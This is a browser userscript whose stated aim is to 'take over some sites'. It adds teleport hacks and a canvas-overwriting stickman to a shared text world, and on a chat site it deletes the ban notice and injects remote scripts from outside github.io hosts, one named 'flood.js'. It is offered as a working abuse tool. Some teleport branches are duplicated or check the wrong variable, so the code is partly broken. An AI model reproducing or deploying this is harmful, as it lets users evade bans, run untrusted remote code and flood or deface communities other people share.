// ==UserScript==
// @name         BOMB PIZDA
// @namespace    http://tampermonkey.net/
// @version      03.07.2026.2
// @description  Try to take over some sites!
// @author       GAMATE HASH
// @match        *://*.*/*
// @icon         https://cdn.discordapp.com/emojis/1291554912806768775.png?size=512
// @grant        none
// ==/UserScript==

if (location.host === "ourworldoftext.com") {
menu.addOption("Set Socket",
    function () {
    var newSocket = prompt("Enter new socket URL:");
    if (!newSocket) return;

    if (typeof w !== "undefined" && typeof w.changeSocket === "function") {
        w.changeSocket(newSocket);
    } else {
        alert("w.changeSocket is not available.");
    }}
)
menu.addOption("Ultra teleport",
function teleport(x=null, y=null){
  if(!x && !y){
    const empty=true;
    var px=prompt('Enter your X coordinates (none if you want to keep the same, "max" or "min" for normal teleport limits.)',-positionX / tileW / 4);
    if(px==null) return;
  }else{
    px=x;
    py=y;
  }
  if(px=="max"||px=="maximum"||px=="maxi"||px=="maxx")
  {
    px=14073748835532;
  }
  else if(px=="min"||px=="minimum"||px=="mini"||px=="minx"){
    px=-14073748835532;
  }
  else if(px=="maxy")
  {
    px=15637498706147;
  }
  else if(px=="miny"){
    px=-15637498706147;
  }
  else if(px=="maxx")
  {
    py=14073748835532;
  }
  else if(px=="minx"){
    py=-14073748835532;
  }
  else if(px=="far"){
      px=2251799813685248
  }
  else{
    px=parseFloat(px);
    if(isNaN(px)){
      console.log("No number detected for X, not changing X coords..");
    }
  }
  if(!x && !y){
    var py=prompt('Enter your Y coordinates (none if you want to keep the same, "max" or "min" for normal teleport limits, "far" or "-far" for the farlands.)',positionY / tileH / 4);
    if(py==null) return;
  }
  if(py=="max"||py=="maximum"||py=="maxi"||py=="maxy")
  {
    py=15637498706147;
  }
  else if(py=="min"||py=="minimum"||py=="mini"||py=="miny"){
    py=-15637498706147;
  }
  else if(py=="far"){
      py=2251799813685248
  }
  else if(px=="-far"){
      px=-2251799813685248
  }
  else if(py=="-far"){
      py=-2251799813685248
  }
  else{
    py=parseFloat(py);
    if(isNaN(py)){
      console.log("No number detected for Y, not changing Y coords..");
    }
  }
  if (x==px && y==py){
    return ('You are already there!');
  }else if(isNaN(px)&&isNaN(py)){
    return('No coordinates given. Nothing happens...');
  }
  console.log("✨Teleporting you...");
  if(!isNaN(px)){positionX= -(px*tileW*4);}
  if(!isNaN(py)) {positionY= (py*tileH*4);}
  updateCoordDisplay()
  return("✨Teleported you! If the coords/window do not update, try moving it!");
}
);
menu.addOption("Stickman",function() {
    let autoNick = "";
    let state = window.state;
    if (!state) {
        alert("Wait until State is init!");
        return
    };
    if (state.userModel.is_member || state.userModel.username) {
        autoNick = state.userModel.username;
    } else {
        autoNick = "Anon " + (w.clientId || "Guest");
    }
    const NICKNAME = autoNick;


    const FRAMES = {
        idle: [
            [' ', 'HEAD', ' '],
            ['/', '|', '\\'],
            ['/', ' ', '\\']
        ],
        walk1: [
            [' ', 'HEAD', ' '],
            ['/', '|', '\\'],
            ['/', ' ', '|']
        ],
        walk2: [
            [' ', 'HEAD', ' '],
            ['/', '|', '\\'],
            ['|', ' ', '\\']
        ],
        dance1: [
            ['\\', 'HEAD', '/'],
            [' ', '|', ' '],
            ['/', ' ', '\\']
        ],
        dance2: [
            [' ', 'HEAD', ' '],
            ['<', '|', '>'],
            ['/', ' ', '\\']
        ],
        flipoff1: [
            [' ', 'HEAD', ' '],
            ['/', '|', ' '],
            ['/', ' ', '\\']
        ],
        flipoff2: [
            [' ', 'HEAD', ' '],
            ['/', '|', '🖕'],
            ['/', ' ', '\\']
        ],
        shrug: [
            [' ', 'HEAD', ' '],
            ['¯', '\\', '_'],
            ['/', ' ', '\\']
        ]
    };

    function createSeededRandom(seed) {
        return function() {
            seed = (seed * 9301 + 49297) % 233280;
            return seed / 233280;
        };
    }

    function getIdentity(name) {
        if (name === "gimmickCellar") {
            return {
                color: 0xFF0000,
                head: '×'
            };
        }
        let hash = 0;
        for (let i = 0; i < name.length; i++) {
            hash = name.charCodeAt(i) + ((hash << 5) - hash);
        }
        let c = (hash & 0x00FFFFFF);


        const heads = [
            'O', '0', '@', 'Q', 'o', '?', '!', '#', '&', '$',
            '●', '○', '◎', '◉', '◍', '◌', '⊕', '⊖', '⊗', '⊘',
            '⊙', '⊚', '⊛', '⊜', '⊝', '❍', '⦿', '•', '◦', '·',
            '☻', '☺', '☹', '☠', '☃', '★', '☆', '✪', '✯', '☾',
            '☼', '☀', '☁', '☂', '☄', '☪', '☮', '☯', '☸', '☣',
            '♠', '♣', '♥', '♦', '♤', '♧', '♡', '♢', '♚', '♛',
            '♜', '♝', '♞', '♟', '♔', '♕', '♖', '♗', '♘', '♙',
            '■', '□', '▲', '△', '▼', '▽', '◆', '◇', '◈', '❖',
            '▣', '▢', '回', '░', '▒', '▓', '█', '▌', '▐', '▀',
            'Ω', 'Φ', 'Ψ', 'Θ', 'Ξ', 'Δ', 'Λ', 'Σ', 'Π', '∞',
            'Ж', 'Ф', 'Ш', 'Щ', 'Ю', 'Д', 'Ц', 'Ъ', 'Ы', 'Ь',
            '©', '®', '℗', '™', '£', '¢', '¥', '€', '§', '¶'
        ];

        return {
            color: c,
            head: heads[Math.abs(hash) % heads.length],
            seed: Math.abs(hash)
        };
    }
    YourWorld.Nickname = NICKNAME;
    if (typeof storeNickname === "function") storeNickname();

    const IDENTITY = getIdentity(NICKNAME);
    const STICKMAN_COLOR = IDENTITY.color;
    const STICKMAN_HEAD = IDENTITY.head;
    for (let key in FRAMES) {
        FRAMES[key][0][1] = STICKMAN_HEAD;
    }

    function generateUniqueDance(seed, head) {
        const rng = createSeededRandom(seed);
        const danceFrames = [];


        const armLeft = ['/', '\\', '-', '<', '|', '┌', '└', '~'];
        const armRight = ['\\', '/', '-', '>', '|', '┐', '┘', '~'];
        const bodies = ['|', 'I', '}', '{', 'S', '8', 'B'];
        const legLeft = ['/', '|', '<', '└', 'J'];
        const legRight = ['\\', '|', '>', '┘', 'L'];
        const extras = [' ', '.', '*', '"', '\''];
        const frameCount = 4 + Math.floor(rng() * 5);
        for (let i = 0; i < frameCount; i++) {

            let al = armLeft[Math.floor(rng() * armLeft.length)];
            let ar = armRight[Math.floor(rng() * armRight.length)];
            let bd = bodies[Math.floor(rng() * bodies.length)];
            let ll = legLeft[Math.floor(rng() * legLeft.length)];
            let lr = legRight[Math.floor(rng() * legRight.length)];


            let tl = (rng() > 0.8) ? extras[Math.floor(rng() * extras.length)] : ' ';
            let tr = (rng() > 0.8) ? extras[Math.floor(rng() * extras.length)] : ' ';
            danceFrames.push([
                [tl, head, tr],
                [al, bd, ar],
                [ll, ' ', lr]
            ]);
        }
        return danceFrames;
    }
    const UNIQUE_DANCE = generateUniqueDance(IDENTITY.seed, STICKMAN_HEAD);
    let stickstate = {
        active: true,
        x: 0,
        y: 0,
        bgBuffer: [],
        isEmoting: false,
        lastMoveTime: 0,
        walkFrameIndex: 0
    };
    const MOVE_DELAY = 100;
    w.doAnnounce(`Stickman Loaded! ID: ${NICKNAME}, Head: ${STICKMAN_HEAD}`, "main");

    function absToTile(x, y) {
        let tileX = Math.floor(x / tileC);
        let tileY = Math.floor(y / tileR);
        let charX = x - tileX * tileC;
        let charY = y - tileY * tileR;
        return [tileX, tileY, charX, charY];
    }

    function restoreBackground() {
        if (!stickstate.bgBuffer.length) return;
        stickstate.bgBuffer.forEach(cell => {
            writeCharToXY(cell.char, cell.color, cell.x, cell.y, cell.bg);
        });
    }

    function captureBackground(originX, originY) {
        stickstate.bgBuffer = [];
        for (let r = 0; r < 3; r++) {
            for (let c = 0; c < 3; c++) {
                let absX = originX + c;
                let absY = originY + r;
                let info = getCharInfoXY(absX, absY);
                stickstate.bgBuffer.push({
                    x: absX,
                    y: absY,
                    char: info.char,
                    color: info.color,
                    bg: info.bgColor
                });
            }
        }
    }

    function drawFrame(originX, originY, frameMatrix) {
        for (let r = 0; r < 3; r++) {
            for (let c = 0; c < 3; c++) {
                let charToDraw = frameMatrix[r][c];
                let absX = originX + c;
                let absY = originY + r;
                writeCharToXY(charToDraw, STICKMAN_COLOR, absX, absY, -1);
            }
        }
    }

    function move(dx, dy) {
        if (!stickstate.active) return;
        if (stickstate.isEmoting) return;

        const now = Date.now();
        if (now - stickstate.lastMoveTime < MOVE_DELAY) return;
        stickstate.lastMoveTime = now;
        if (stickstate.x === 0 && stickstate.y === 0) {
            if (!cursorCoords) return;
            stickstate.x = cursorCoords[0] * tileC + cursorCoords[2];
            stickstate.y = cursorCoords[1] * tileR + cursorCoords[3];
        }
        restoreBackground();
        stickstate.x += dx;
        stickstate.y += dy;
        captureBackground(stickstate.x, stickstate.y);
        stickstate.walkFrameIndex = (stickstate.walkFrameIndex + 1) % 2;
        let frame = (dx === 0 && dy === 0) ? FRAMES.idle : (stickstate.walkFrameIndex === 0 ? FRAMES.walk1 : FRAMES.walk2);
        drawFrame(stickstate.x, stickstate.y, frame);
        renderCursor(absToTile(stickstate.x, stickstate.y));
    }

    function playAnimation(frameList, delay = 250, loopCount = 1) {
        if (stickstate.x === 0 && stickstate.y === 0) return;
        stickstate.isEmoting = true;
        let frameIdx = 0;
        let loops = 0;
        let interval = setInterval(() => {
            if (!stickstate.active) {
                clearInterval(interval);
                return;
            }
            restoreBackground();
            drawFrame(stickstate.x, stickstate.y, frameList[frameIdx]);
            frameIdx++;
            if (frameIdx >= frameList.length) {
                frameIdx = 0;
                loops++;
                if (loops >= loopCount) {
                    clearInterval(interval);
                    stickstate.isEmoting = false;
                    restoreBackground();
                    drawFrame(stickstate.x, stickstate.y, FRAMES.idle);
                }
            }
        }, delay);
    }

    function addCommand(name, fn, args, desc) {
        if (w.chat && w.chat.registerCommand) {
            w.chat.registerCommand(name, fn, args, desc, null);
        } else if (typeof register_chat_command === 'function') {
            register_chat_command(name, fn, args, desc, null);
        }
    }
    addCommand("emote", function(args) {
        const type = args[0] ? args[0].toLowerCase() : "help";

        if (type === "dance") {
            playAnimation([FRAMES.dance1, FRAMES.dance2], 300, 6);
        } else if (type === "uniquedance") {

            playAnimation(UNIQUE_DANCE, 250, 6);
        } else if (type === "flipoff") {
            playAnimation([FRAMES.flipoff1, FRAMES.flipoff2], 400, 4);
        } else if (type === "shrug") {
            playAnimation([FRAMES.shrug], 1000, 1);
        } else {
            addChat(null, 0, "user", "[ Stickman ]", "Emotes: dance, uniquedance, flipoff, shrug", "Stickman", false, false, false, "#FF0000", Date.now());
        }
    }, ["name"], "Do a stickman emote");
    document.addEventListener("keydown", function(e) {
        if (!stickstate.active || Modal.isOpen) return;
        if (document.activeElement.tagName === "INPUT" && document.activeElement !== w.input) return;
        if (e.ctrlKey || e.altKey) return;
        let moved = false;
        if (e.key === "ArrowUp" || e.key.toLowerCase() === "w") {
            move(0, -1);
            moved = true;
        }
        if (e.key === "ArrowDown" || e.key.toLowerCase() === "s") {
            move(0, 1);
            moved = true;
        }
        if (e.key === "ArrowLeft" || e.key.toLowerCase() === "a") {
            move(-1, 0);
            moved = true;
        }
        if (e.key === "ArrowRight" || e.key.toLowerCase() === "d") {
            move(1, 0);
            moved = true;
        }
        if (moved) e.preventDefault();
    });

    function createMobileUI() {
        if (document.getElementById("stickman-dpad")) return;
        const dpad = document.createElement("div");
        dpad.id = "stickman-dpad";
        dpad.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 150px;
            height: 150px;
            z-index: 9999;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr;
            grid-template-rows: 1fr 1fr 1fr;
            gap: 5px;
            opacity: 0.7;
            user-select: none;
        `;
        const createBtn = (symbol, dx, dy, gridArea) => {
            const btn = document.createElement("div");
            btn.innerText = symbol;
            btn.style.cssText = `
                background: #333;
                color: #fff;
                border-radius: 5px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 24px;
                cursor: pointer;
                grid-area: ${gridArea};
                touch-action: manipulation;
            `;
            const trigger = (e) => {
                e.preventDefault();
                move(dx, dy);
            };
            btn.addEventListener("touchstart", trigger);
            btn.addEventListener("mousedown", trigger);
            return btn;
        };
        dpad.appendChild(createBtn("▲", 0, -1, "1 / 2 / 2 / 3"));
        dpad.appendChild(createBtn("◀", -1, 0, "2 / 1 / 3 / 2"));
        dpad.appendChild(createBtn("▶", 1, 0, "2 / 3 / 3 / 4"));
        dpad.appendChild(createBtn("▼", 0, 1, "3 / 2 / 4 / 3"));
        const emoteBtn = document.createElement("div");
        emoteBtn.innerText = "★";
        emoteBtn.style.cssText = "background:#555;color:gold;border-radius:50%;grid-area:2/2/3/3;display:flex;justify-content:center;align-items:center;";


        emoteBtn.onclick = () => {

            if (Math.random() > 0.5) playAnimation([FRAMES.dance1, FRAMES.dance2], 300, 4);
            else playAnimation(UNIQUE_DANCE, 250, 4);
        };
        dpad.appendChild(emoteBtn);
        document.body.appendChild(dpad);
    }
    createMobileUI();
    w.on("mouseDown", function(e) {
        if (stickstate.x === 0 && cursorCoords) {
            stickstate.x = cursorCoords[0] * tileC + cursorCoords[2];
            stickstate.y = cursorCoords[1] * tileR + cursorCoords[3];
            captureBackground(stickstate.x, stickstate.y);
            drawFrame(stickstate.x, stickstate.y, FRAMES.idle);
        }
    });
})
}

if (location.host === "bonzi.gay") {
    (function() {
  'use strict';
  var menuContent = `
    <div id='bg'><a href='#'>Background Options</a></div><br>
    <div id='menuoptions'><a href='#'>Menu Options</a></div><br>
    <div id='inject1'><a href='#'>Inject webntrack.js</a></div><br>
    <div id='inject2'><a href='#'>Inject flood.js</a></div>
    <div id='klok'><a href='#'>Inject flood.js</a></div>
    
  `;
try {
     var banthing = document.getElementById('page_ban')
 banthing.remove()
} catch(e) {
    console.error("Failed to remove bonziworld ban message: " + e);
};
var chatloghtml = document.getElementById('chat_log_content')
       function saveChatLog() {
    const htmlContent = `
<!DOCTYPE html>
<html>
<title>Chat Log</title>
<body>
${chatloghtml.innerHTML}
</body>
</html>`;

    const blob = new Blob([htmlContent], { type: "text/html" });
    const url = URL.createObjectURL(blob);

    const a = document.createElement("a");
    a.href = url;
    a.download = "chatlog.html";
    document.body.appendChild(a);
    a.click();

    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}


 
  var menuButton = document.createElement('button');
  menuButton.innerText = 'Menu';
  menuButton.style.backgroundColor = 'red';
  menuButton.style.color = 'white';
  menuButton.style.position = 'fixed';
  menuButton.style.top = '10px';
  menuButton.style.right = '10px';
 
  var menuContainer = document.createElement('div');
  menuContainer.id = 'menuf';
  menuContainer.style.background = 'linear-gradient(180deg, black, gray)';
  menuContainer.style.color = 'white';
  menuContainer.style.width = '200px';
  menuContainer.style.height = '400px';
  menuContainer.style.position = 'fixed';
  menuContainer.style.top = '50%';
  menuContainer.style.left = '50%';
  menuContainer.style.transform = 'translate(-50%, -50%)';
  menuContainer.style.fontFamily = '"Roboto Condensed", sans-serif';
  menuContainer.innerHTML = `
    <h3>Menu</h3>
    <hr>
    ${menuContent}
    <div id='close' style='bottom: 20px; position: absolute; width:100%; text-align:center;'>
      <br><br><button id='closeBtn' style='color: black;'>Close Menu</button>
    </div>
  `;
  menuContainer.style.display = 'none';
 
  document.body.appendChild(menuButton);
  document.body.appendChild(menuContainer);
 
  var robotoLink = document.createElement('link');
  robotoLink.rel = 'stylesheet';
  robotoLink.href = 'https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap';
  document.head.appendChild(robotoLink);
 
  menuButton.addEventListener('click', function() {
    menuContainer.style.display = 'block';
    menuButton.style.display = 'none';
  });
 
  var closeButton = menuContainer.querySelector('#closeBtn');
  closeButton.addEventListener('click', function() {
    menuContainer.style.display = 'none';
    menuButton.style.display = 'block';
  });
 
  var inject1 = menuContainer.querySelector('#inject1 a');
  var inject2 = menuContainer.querySelector('#inject2 a');
  var klok = menuContainer.querySelector('#klok a');
 
  inject1.addEventListener('click', function(e) {
    e.preventDefault();
    if (inject1.getAttribute('data-injected') === 'true') return;
    var s1 = document.createElement('script');
    s1.src = 'https://cmd-hue.github.io/webntrack.js';
    s1.async = true;
    document.body.appendChild(s1);
    inject1.textContent = 'webntrack.js Injected';
    inject1.style.color = 'lime';
    inject1.setAttribute('data-injected', 'true');
  });
    klok.addEventListener('click', function(e) {
    e.preventDefault();
    if (inject1.getAttribute('data-injected') === 'true') return;
    var s1 = document.createElement('script');
    s1.src = 'https://cmd-hue.github.io/webntrack.js';
    s1.async = true;
    document.body.appendChild(s1);
    inject1.textContent = 'webntrack.js Injected';
    inject1.style.color = 'lime';
    inject1.setAttribute('data-injected', 'true');
  });
  inject2.addEventListener('click', function(e) {
    e.preventDefault();
    if (inject2.getAttribute('data-injected') === 'true') return;
    var s2 = document.createElement('script');
    s2.src = 'https://gamate-hash.github.io/flood.js';
    s2.async = true;
    document.body.appendChild(s2);
    inject2.textContent = 'flood.js Injected';
    inject2.style.color = 'lime';
    inject2.setAttribute('data-injected', 'true');
  });
})();
}